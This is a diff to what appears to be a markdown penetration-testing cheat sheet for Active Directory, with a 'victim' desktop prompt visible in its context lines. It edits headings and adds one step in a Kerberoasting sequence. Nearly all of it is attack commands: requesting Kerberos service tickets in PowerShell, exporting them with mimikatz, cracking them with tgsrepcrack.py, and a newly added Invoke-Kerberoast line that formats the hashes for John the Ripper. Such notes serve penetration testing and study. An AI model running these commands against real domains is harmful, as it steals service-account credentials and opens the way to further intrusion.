@@ -165,7 +165,7 @@ C:\Users\victim\Desktop>sc start SNMPTRAP
 &nbsp;
 
 
-**[+] Request Ticket (powershell)**
+**[+] Request a ticket (powershell)**
 
 ```powershell
 Add-Type -AssemblyName System.IdentityModel  
@@ -175,7 +175,7 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 
 &nbsp;
 
-**[+] Export Tickets using mimikatz**
+**[+] Export all tickets using Mimikatz**
 
 ```powershell
 mimikatz # kerberos::list /export  
@@ -187,6 +187,14 @@ mimikatz # kerberos::list /export
 
 ```powershell
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.hitmanalharbi.local~1433-boo.LOCAL.kirbi  
+```
+
+&nbsp;
+
+**[+] Export all tickets to John format (Need PowerView.ps1)**
+
+```powershell
+Invoke-Kerberoast -OutputFormat john | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')}
 ```
 
 &nbsp;
